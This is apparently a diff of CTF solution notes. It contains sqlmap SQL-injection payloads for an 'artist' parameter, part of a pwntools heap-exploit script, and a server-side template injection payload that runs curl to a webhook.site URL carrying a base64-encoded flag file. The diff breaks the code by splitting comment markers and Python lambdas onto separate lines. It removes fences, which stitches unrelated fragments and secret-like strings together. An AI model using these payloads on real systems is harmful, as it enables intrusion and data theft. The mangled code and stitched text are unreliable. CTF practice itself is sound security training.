@@ -40,7 +40,8 @@ WolfHowl | SOLVED | working : 1sp
 Parameter: artist (POST)
  Type: boolean-based blind
  Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
- Payload: artist=-3263" OR 7394=7394#
+ Payload: artist=-3263" OR 7394=7394
+#
 
  Type: error-based
  Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
@@ -52,7 +53,8 @@ Parameter: artist (POST)
 
  Type: UNION query
  Title: MySQL UNION query (NULL) - 4 columns
- Payload: artist=1" UNION ALL SELECT CONCAT(0x716a6a7171,0x63625249444c584a65536b6c4d5465485a4e7777704971536d697a6e66694d534a4b6372577a5953,0x7178717871),NULL,NULL,NULL#
+ Payload: artist=1" UNION ALL SELECT CONCAT(0x716a6a7171,0x63625249444c584a65536b6c4d5465485a4e7777704971536d697a6e66694d534a4b6372577a5953,0x7178717871),NULL,NULL,NULL
+#
 ---
 
 image.png
@@ -80,8 +82,10 @@ context(arch='amd64',endian='el',os='linux')
 context.log_level='debug'
 context.terminal = ['tmux','splitw','-h']
 
-l64 = lambda     :u64(p.recvuntil("x7f")[-6:].ljust(8,"x00"))
-l32 = lambda     :u32(p.recvuntil("xf7")[-4:].ljust(4,"x00"))
+l64 = lambda     :
+u64(p.recvuntil("x7f")[-6:].ljust(8,"x00"))
+l32 = lambda     :
+u32(p.recvuntil("xf7")[-4:].ljust(4,"x00"))
 leak  = lambda name,data : p.success(name + ": 0x%x" % data)
 sd  = lambda payload: p.send(payload)
 sa  = lambda a,b :p.sendafter(str(a),str(b))
@@ -246,16 +250,12 @@ Twitter：@wgpsec
 
 ```
 {{process.mainModule.require('child_process').exec('curl https://webhook.site/3cb22bdf-1ff2-47d5-b99f-d6b7b186398b?$(cat flag.txt | base64)')}}
-```
-
-
-
-```
 ---
 Parameter: artist (POST)
  Type: boolean-based blind
  Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
- Payload: artist=-3263" OR 7394=7394#
+ Payload: artist=-3263" OR 7394=7394
+#
 
  Type: error-based
  Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
@@ -267,33 +267,21 @@ Parameter: artist (POST)
 
  Type: UNION query
  Title: MySQL UNION query (NULL) - 4 columns
- Payload: artist=1" UNION ALL SELECT CONCAT(0x716a6a7171,0x63625249444c584a65536b6c4d5465485a4e7777704971536d697a6e66694d534a4b6372577a5953,0x7178717871),NULL,NULL,NULL#
+ Payload: artist=1" UNION ALL SELECT CONCAT(0x716a6a7171,0x63625249444c584a65536b6c4d5465485a4e7777704971536d697a6e66694d534a4b6372577a5953,0x7178717871),NULL,NULL,NULL
+#
 ---
-```
-
-
-
-```
 secret reminder: 8vqB5xhrTdPzPDXpSpOTY3oTB3ExpZJdrsFGm/hq/yE=
-```
-
-
-
-```
 88f610ef47779376b014e9fea4e0b76c0e4608d5dd339e4f782c8ee41d4f1d2e1d3992d5da8d6ea206da0914d4f30e0903b6a8606772e84bf0d33f0625a4c4c1ca929feef818c0fb82266fc32a31ea0b6a2de955f55a71fdfe0fb7bfa6f48dec
-```
-
-
-
-```
 #!/usr/bin/python2
 from pwn import *
 context(arch='amd64',endian='el',os='linux')
 context.log_level='debug'
 context.terminal = ['tmux','splitw','-h']
 
-l64 = lambda     :u64(p.recvuntil("x7f")[-6:].ljust(8,"x00"))
-l32 = lambda     :u32(p.recvuntil("xf7")[-4:].ljust(4,"x00"))
+l64 = lambda     :
+u64(p.recvuntil("x7f")[-6:].ljust(8,"x00"))
+l32 = lambda     :
+u32(p.recvuntil("xf7")[-4:].ljust(4,"x00"))
 leak  = lambda name,data : p.success(name + ": 0x%x" % data)
 sd  = lambda payload: p.send(payload)
 sa  = lambda a,b :p.sendafter(str(a),str(b))
@@ -352,29 +340,9 @@ addrand()
 info("heap_base = " + hex(heap_base))
 info("main_base = " + hex(main_base))
 p.interactive()
-```
-
-
-
-```
 6iSGODh39bqvH0EF
-```
-
-
-
-```
 pSLPV4TH96ZHbNUq
-```
-
-
-
-```
 q2bPAaYuMVl2HLUw
-```
-
-
-
-```
 from z3 import *
 
 x = [Int(f'x{i}') for i in range(16)]
